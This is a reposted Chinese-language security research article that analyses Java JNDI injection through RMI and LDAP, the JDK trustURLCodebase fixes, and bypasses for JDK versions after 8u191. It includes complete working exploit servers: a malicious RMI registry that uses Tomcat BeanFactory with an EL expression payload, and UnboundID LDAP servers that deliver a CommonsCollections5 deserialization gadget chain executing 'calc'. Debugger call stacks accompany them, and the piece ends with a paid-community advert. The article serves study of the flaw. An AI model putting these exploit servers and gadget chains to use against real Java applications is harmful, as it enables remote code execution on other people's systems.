<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YTl21MHFuyd37H7qH5XzfQ)

扫码领资料

获网安教程

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSFbaUgVwdsriauB77CgQS8lyBNAxtx9IMqJQdhuuoITunu8A5Gp7kFjF7BvEXSaLMuDTYhnu7Nicghg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

JNDI
====

JNDI（全称 Java Naming and Directory Interface）是用于目录服务的 Java API，它允许 Java 客户端通过名称发现和查找数据和资源 (以 Java 对象的形式)。与与主机系统接口的所有 Java api 一样，JNDI 独立于底层实现。此外，它指定了一个服务提供者接口 (SPI)，该接口允许将目录服务实现插入到框架中。通过 JNDI 查询的信息可能由服务器、文件或数据库提供，选择取决于所使用的实现。

JNDI 注入 + rmi
=============

JNDIClient

```
public class JNDIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        IRemoteObj o = (IRemoteObj) initialContext.lookup("rmi://127.0.0.1:1099/remoteOb");
        System.out.println(o.sayHello("hello"));
    }
}


```

JNDIServer

```
public class JNDIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        LocateRegistry.createRegistry(1099);
        initialContext.rebind("rmi://localhost:1099/remoteOb",new RemoteObImpl());
    }
}


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWndV6UjiaK02meRQDQCOdax6V6KEPuAoGfKXDxg6rcRl6x9I7BsbZTxtg/640?wx_fmt=png&from=appmsg)

跟进一下客户端 lookup 方法, 跟进到 RegistryContext 类的 lookup 方法，从这里可以看出来，其实调用的还是 RMI 的东西。如果客户端的 lookup 参数可控，就可以让它访问我们恶意的链接了。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnpk0JQCib1bqnHdvLnNwJu90amOKILPSyOJBO10FoLLCj6ztEeVvOoEg/640?wx_fmt=png&from=appmsg)

绑定引用对象
------

```
public class JNDIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Reference reference = new Reference("TestRef", "TestRef", "http://localhost:6666/");
        initialContext.rebind("rmi://localhost:1099/remoteOb",reference);
    }
}


```

看一下 Reference 类。工厂，第一个参数类型 className，第二个工厂名 factory，工厂的位置。

```
    /**
      * Constructs a new reference for an object with class name 'className',
      * and the class name and location of the object's factory.
      *
      * @param className The non-null class name of the object to which
      *                         this reference refers.
      * @param factory  The possibly null class name of the object's factory.
      * @param factoryLocation
      *         The possibly null location from which to load
      *         the factory (e.g. URL)
      * @see javax.naming.spi.ObjectFactory
      * @see javax.naming.spi.NamingManager#getObjectInstance
      */
    public Reference(String className, String factory, String factoryLocation) {
        this(className);
        classFactory = factory;
        classFactoryLocation = factoryLocation;
    }


```

启一个 JNDIServer，在 testref.class 文件所在的位置起一个 http 的 web 服务，将 reference 引用绑定在 remoteOb 上，然后在 JNDIClient 客户端访问，

```
public class JNDIServer {
    public static void main(String[] args) throws Exception{
        LocateRegistry.createRegistry(1099);
        InitialContext initialContext = new InitialContext();
        Reference reference = new Reference("TestRef", "TestRef", "http://localhost:6666/");
        initialContext.rebind("rmi://localhost:1099/remoteOb",reference);
    }
}


```

适用场景就是当我们能控制服务端 lookup 的参数时，就可以访问恶意的对象。

接下来具体分析流程。在客户端跟进 lookup 方法。其实就是一系列的调用，过程如下图。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnhRdUdno9bw2WqGa1PMunpYyf9DZrsvMLQ30IexKKGEKLw6hE7u14JA/640?wx_fmt=png&from=appmsg)

这里获取到的对象是 ReferenceWrapper_Stub，并不是服务端绑定的 Reference，这是因为服务端调用了一个 encodeObject 方法将 Reference 类转成了 ReferenceWrapper，所以客户端获取到之后要 decode。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnKzeEO1icqdfoe7ndaKfGia3XUPyfnDWmzU3vqHYmFTUxpicxpJx0AGXicA/640?wx_fmt=png&from=appmsg)

到这里的调用栈如下。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnx7xIXp3UibuCGLoN4icyzCDyhw4iay1iatT06tuGeXFmpagSJbaGDV23sw/640?wx_fmt=png&from=appmsg)

decode 之后就拿到了原先的 Reference，同时在这个方法中调用了 NamingManager.getObjectInstance() 方法，跟进  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnSVnJA43GicPbIsCuic1MUXLdSJrVdszE7VzzXl3ZugIt5Kibs7OOrexgQ/640?wx_fmt=png&from=appmsg)  
在 319 行调用了 getObjectFactoryFromReference 方法，从引用中获取对象工厂

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnXfP1H533oupScHMosO3HpoorCdZffpJ2B3OHASotXTaP9Xr5r7JZRg/640?wx_fmt=png&from=appmsg)  
这个方法中首先调用 loadClass 加载，调用 AppClassLoader 本机加载，此时是加载失败找不到的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnNFFvL3N4t2WdxdBXLibkibKhYkyEbKMHw8ibaDyrVoXrV40u4bGTACvHA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnYJ4rLohawRicyp9Ic6iaxKIRe520IWibThIpDhYS5mDJoFkp7VMkSlThw/640?wx_fmt=png&from=appmsg)

接下来就是利用 codebase 查找，codebase 就是上面提到 Reference 的 factoryLocation，在调用 loadClass 加载  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnGcpicm5gRamBA3753nmtiatfFtD8rWjF2K8e8qia8LyuRSoWUBnVdKtCw/640?wx_fmt=png&from=appmsg)

把 codebase 传入 URLClassLoader，利用 loadClass 加载  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnEGwWjvyia59evicXIaJnGaSor6iadltYNxc18qXibVXoGp7kiaCAbLTag2A/640?wx_fmt=png&from=appmsg)  
这个里面就会对应初始化加载，对应 URL 下面的类。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnJibicNysa1icwo2LOcqWqiacvUicmtgAGAnegIoycWrsbTn5MYNFsyrm41Q/640?wx_fmt=png&from=appmsg)  
找到之后 newInstance 实例化，执行完这一步就可以弹出计算器了。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnYylaFxQ9dRiacYhvfUoA7tQYRjVrjQezNQhchAvZZZPS8lKEvVibETuA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnibYdJG2XXrVMCnCCqunTv7NVHfVGMbcc4BO8Z6hibiaOibLada5r7P4Ljg/640?wx_fmt=png&from=appmsg)  
在 JDK 6u132, JDK 7u122, JDK 8u113 中 Java 限制了通过 RMI 远程加载 Reference 工厂类，com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了 false，即默认不允许通过 RMI 从远程的 Codebase 加载 Reference 工厂类。  
在 RegistryContext 类中的 trustURLCodebase 默认值是 false, 所以程序不会再向下执行。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnqbHjpZNqJRrib9vRnR3oMDKN242m3NnhQ2qpQJtre3v9cKguOLibptyQ/640?wx_fmt=png&from=appmsg)

JNDI 注入 + ldap
==============

但是需要注意的是 JNDI 不仅可以从通过 RMI 加载远程的 Reference 工厂类，也可以通过 LDAP 协议加载远程的 Reference 工厂类，但是在修复 RMI 的时候并没有对 LDAP 进行修复，所以在 JDK 11.0.1、8u191、7u201、6u211 之前 LDAP 还是可以利用的。

使用 JNDI 工具启动一个 LDAPF 服务。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnIICDiaOu0cbia90tGv3fZloA8PZJ6ZYLNCicJfttqzs8QKjRNgHzYR3lQ/640?wx_fmt=png&from=appmsg)

客户端调试跟踪分析流程

```
    public static void main(String[] args) throws NamingException {
        Object object=new InitialContext().lookup("ldap://127.0.0.1:1389/koh13g");
    }


```

根据追踪 lookup 方法，最后走到 PartialCompositeContext 类的 lookup 方法，方法中又调用了 p_lookup 方法，这个方法中又要用了 c_lookup 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnuzkfkV2MRL8rPynL52YNKuWCahybribHqdibTZ9d2cEh2xp9GdGMLCOA/640?wx_fmt=png&from=appmsg)

c_lookup 方法要用了 decodeObject 方法，走到这里就想到在 rmi 中也要用了这个方法，并看到传入的参数 var4 其实跟 rmi 也是一样的，codebase、类名、工厂等。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnicuBZuyddVA4dfyeceSNNUfFFibxIvickPX72XNDQjZAy8iae7ArN7LDWA/640?wx_fmt=png&from=appmsg)

在 decodeObject 方法又分了几种情况，因为 jndi 支持序列化、引用的、远程对象的，通过获取到的属性来判断是属于那种方式。

因为此时为引用，所以会调用 decodeReference 方法，方法中把类名啥的都获取到。然后回到 c_lookup 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnniafsdnqjN533IfgXeTMNZntEeMBLzCFeiasMSmpuZJ5zfAPMtPrgFAQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnotDibQsAva8wtBdybsicjNY488eJicWMLcRREAja5qmldm8QvggDicZxng/640?wx_fmt=png&from=appmsg)

c_lookup 方法中又调用了 DirectoryManager.getObjectInstance() 方法，在 rmi 中是调用的 NamingManager.getObjectInstance() 方法，后续的流程在方法中又调用 getObjectFactoryFromReference() 方法，通过 loadClass 加载远程加载对象。调用 AppClassLoader 本机加载，此时是加载失败找不到的, 接下来就是利用 codebase 查找，codebase 就是上面提到 Reference 的 factoryLocation，再利用 loadClass 加载等等。

因为 RMI 跟 LDAP 前半部分的调用流程并不一样，当 RMI 修改了流程中的 decodeObject 方法，并不会影响到 LDAP 流程中的 decodeObject 方法，在之后的版本 Java 也对 LDAP Reference 远程加载 Factory 类进行了限制，在 JDK 11.0.1、8u191、7u201、6u211 之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的值默认为 false。

用 8u333 测试了一下，在 VersionHelper12 类的 loadClass 方法中有 trustURLCodebase 属性的判断，如下图所示。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWn2ESNkUPMv8QoY3uWJ4vq5zcO7E91zyXxFENuaxHpVgrQ7jOVBqYfdA/640?wx_fmt=png&from=appmsg)

JDK 版本 > 8u191
==============

通过加载本地类
-------

从上面的 RMI 跟 LDAP 的过程中可以看到，都是利用远程加载并也已经修复了，但是不是也可以利用本地的类进行利用，对于本地的类也是有要求的，这个类必须是个工厂类，该工厂类型必须实现 javax.naming.spi.ObjectFactory 接口，因为在 javax.naming.spi.NamingManager#getObjectFactoryFromReference 最后的 return 语句对工厂类的实例对象进行了类型转换 return (clas != null) ? (ObjectFactory) clas.newInstance() : null;；并且该工厂类至少存在一个 getObjectInstance() 方法，根据网上文章 org.apache.naming.factory.BeanFactory 是可利用的，并且该类存在于 Tomcat 依赖包中应用比较广泛。

Tomcat8

首先加载 maven, 如果 com.springsource.org.apache.el 包获取失败，可以下载对应 jar 包然后导入。

```
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.0</version>
</dependency>

<dependency>
    <groupId>org.apache.el</groupId>
    <artifactId>com.springsource.org.apache.el</artifactId>
    <version>7.0.26</version>
</dependency>


```

服务端示例代码如下

```
    public static void main(String[] args) throws Exception{

        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);

    }


```

客户端示例代码如下

```
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("rmi://localhost:1097/Object");
    }


```

效果图如下所示  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWng3RuZTlyDicmotM4hppaUptMpW1ISoPw5d3icasQxL6awTQJxFiaCaj3g/640?wx_fmt=png&from=appmsg)

调试跟踪分析流程

前面的流程跟 RMI 和 LDAP 是一样的，跟到 RegistryContext.decodeObject() 方法，工厂就是指定的 org.apache.naming.factory.BeanFactory，  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWn9giauOYVyc7aVIkkZeJjPhX78ZjLJLzHZUucUhAPky9GZzicSgTHzBCA/640?wx_fmt=png&from=appmsg)

接下来的流程也一样，走到 getObjectFactoryFromReference 方法，接着就是 loadClass 本地加载对应的类，clas 不是 null，就说明本地加载到了，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWn6GVhWSEYzypvGYbibmhy465ibCCwFPCxq19QK8UmVJcVPmMbwB6FX2jQ/640?wx_fmt=png&from=appmsg)

最后在 getObjectInstance 方法中反射的调用 invoke 执行 EL 表达式，完成命令执行。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWn4wO6BSSNyyDxrZ0qkUIMQM89rwByN6HkYkOxxW6WGfhYyeLb6Z0iayg/640?wx_fmt=png&from=appmsg)

调用栈

```
getObjectInstance:211, BeanFactory (org.apache.naming.factory)
getObjectInstance:321, NamingManager (javax.naming.spi)
decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:417, InitialContext (javax.naming)
main:9, JNDIClient (org.example)


```

触发本地存在的 Gadget
--------------

加入本地依赖中存在漏洞，可以尝试出发本地漏洞，这里存在 CC 依赖，CommonsCollections5 来尝试

```
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class JNDIServer {

        private static final String LDAP_BASE = "dc=example,dc=com";
        public static void main ( String[] tmp_args ) throws Exception{
            String[] args=new String[]{"http://x.x.x.x/#aaa"};
            int port = 6666;

            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();
        }

        private static class OperationInterceptor extends InMemoryOperationInterceptor {

            private URL codebase;

            public OperationInterceptor ( URL cb ) {
                this.codebase = cb;
            }

            @Override
            public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                }
                catch ( Exception e1 ) {
                    e1.printStackTrace();
                }
            }

            protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {

                e.addAttribute("javaClassName", "foo");
                e.addAttribute("javaSerializedData",CommonsCollections5());

                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
        }

        private static byte[] CommonsCollections5() throws Exception{
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{\}\}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{\}\}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };

            ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
            Map map=new HashMap();
            Map lazyMap=LazyMap.decorate(map,chainedTransformer);
            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");
            BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
            Field field=badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException,tiedMapEntry);

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();

            return byteArrayOutputStream.toByteArray();
        }

}


```

客户端尝试触发，效果如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWn7nRJ5qS74iciaSsvSxezTNWv7Ugm1oGs1yvuj8MHQzhYwIj6MWUiaRUWA/640?wx_fmt=png&from=appmsg)

调试跟踪分析流程

前面流程跟 LDAP 流程相同，还是会走到 Obj 类中的 decodeObject 方法，JAVA_ATTRIBUTES 字段有 "objectClass", "javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", "javaReferenceAddress", "javaClassNames", "javaRemoteLocation",JAVA_ATTRIBUTES[1] 就是 javaSerializedData，在起服务端的时候配置了这个字段，不为空就进入到 deserializeObject 方法中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnFRL5CgQQYltfqrjiaibZ8GRTzFUCEnfDCia26n958kvwF0icxqZibSLcARQ/640?wx_fmt=png&from=appmsg)

deserializeObject 方法中对 var20 进行反序列化，var20 就是服务端在其中时给 javaSerializedData 的赋值，就是恶意的序列化数据。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnwO3xYEAO6Nib8puh02MdU65Lv9hYQRzicWNELIjWQib7TULdTKN5ia4iabw/640?wx_fmt=png&from=appmsg)

调用栈如下

```
deserializeObject:532, Obj (com.sun.jndi.ldap)
decodeObject:239, Obj (com.sun.jndi.ldap)
c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:9, JNDIClient (org.example)


```

其实还有一处反序列化的点，在 com/sun/jndi/ldap/Obj.java#decodeReference 中，这个方法中也调用了上面例子中反序列化时经过的方法 deserializeObject，如果程序能走到这里，也就意味着也可以进行反序列化操作。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWnBhlic3m8sFyH5iajZUQ3XmjFIiaY4HSX4CH3Oxt3bNEtmvFFtS0Hrich1g/640?wx_fmt=png&from=appmsg)

首先要看一下怎样才能进入 decodeReference 方法中，在上面例子中讲到通过 Obj 类中的 decodeObject 方法在启动时给 JAVA_ATTRIBUTES 的 javaSerializedData 赋值进入了 deserializeObject 方法，但是在 decodeObject 方法中也调用了 decodeReference 方法，如果要进入要在启动时给 JAVA_ATTRIBUTES 的 objectClass 赋值。

在反序列化利用时调用的参数时 JAVA_ATTRIBUTES 的 javaReferenceAddress，所以要把恶意代码赋值给这个参数，但这个参数在赋值时有如下要求：

*   第一个字符为分隔符
    
*   第一个分隔符与第二个分隔符之间，表示 Reference 的 position，为 int 类型
    
*   第二个分隔符与第三个分隔符之间，表示 type，类型
    
*   第三个分隔符是双分隔符的形式，则进入反序列化的操作
    
*   序列化数据用 base64 编码
    

javaClassName 这个参数不能去掉，因为在调用 decodeObject 方法时对 JAVA_ATTRIBUTES 的 javaClassName 进行了判断，只有不为空时才能进入 decodeObject 方法

```
    static Object decodeObject(Attributes var0) throws NamingException {
        String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));

        try {
            Attribute var1;
            if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
                ClassLoader var3 = helper.getURLClassLoader(var2);
                return deserializeObject((byte[])((byte[])var1.get()), var3);
            } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
                return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
            } else {
                var1 = var0.get(JAVA_ATTRIBUTES[0]);
                return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) && !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
            }
        } catch (IOException var5) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var5);
            throw var4;
        }
    }


```

启动的服务端参考如下：

```
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.BASE64Encoder;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class JNDIServer {
        private static final String LDAP_BASE = "dc=example,dc=com";
        public static void main ( String[] tmp_args ) throws Exception{
            String[] args=new String[]{"http://x.x.x.x/#aaa"};
            int port = 6666;

            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();
        }

        private static class OperationInterceptor extends InMemoryOperationInterceptor {

            private URL codebase;

            public OperationInterceptor ( URL cb ) {
                this.codebase = cb;
            }

            @Override
            public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                String base = result.getRequest().getBaseDN();
                Entry e = new Entry(base);
                try {
                    sendResult(result, base, e);
                }
                catch ( Exception e1 ) {
                    e1.printStackTrace();
                }
            }

            protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {

                e.addAttribute("javaClassName", "foo");
                e.addAttribute("javaReferenceAddress","$1$String$$"+new BASE64Encoder().encode(CommonsCollections5()));
                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$

                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            }
        }

        private static byte[] CommonsCollections5() throws Exception{
            Transformer[] transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{\}\}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{\}\}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };

            ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
            Map map=new HashMap();
            Map lazyMap=LazyMap.decorate(map,chainedTransformer);
            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test");
            BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
            Field field=badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException,tiedMapEntry);

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();

            return byteArrayOutputStream.toByteArray();
        }

}


```

客户端尝试触发，效果如下图

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGM8MDl7WAzCGBybodicEqWn7nRJ5qS74iciaSsvSxezTNWv7Ugm1oGs1yvuj8MHQzhYwIj6MWUiaRUWA/640?wx_fmt=png&from=appmsg)

调用栈如下

```
deserializeObject:532, Obj (com.sun.jndi.ldap)
decodeReference:478, Obj (com.sun.jndi.ldap)
decodeObject:251, Obj (com.sun.jndi.ldap)
c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:9, JNDIClient (org.example)

```

```
https://www.veracode.com/blog/research/exploiting-jndi-injections-java
https://xz.aliyun.com/t/8214#toc-3
https://www.bilibili.com/video/BV1P54y1Z7Lf/

```

```
文章来源: https://forum.butian.net/share/2751
文章作者：刺头大哥
如有侵权请联系我们，我们会进行删除并致歉

```

声明：⽂中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**！  

**如果你是一个网络安全爱好者，欢迎加入我的知识星球：zk 安全知识星球, 我们一起进步一起学习。星球不定期会分享一些前言漏洞，每周安全面试经验、SRC 实战纪实等文章分享，微信识别二维码，只需 25，即可加入，如不满意，72 小时内可在 App 内无条件自助退款。**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGpTtick8dYImTUOcmaQWHRzkPIp7SwgncysYUIo0cKZAcHvXcMEBL5ZZEJCIpUP08SGOR8bnejDxQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSE3xxjQrLXjiaAWoqibdM1AFZ0uePzzUOG049bSjeEkbft1NfIm833fQ0ibIbW5IoE2ftnWoS3YxRPLg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)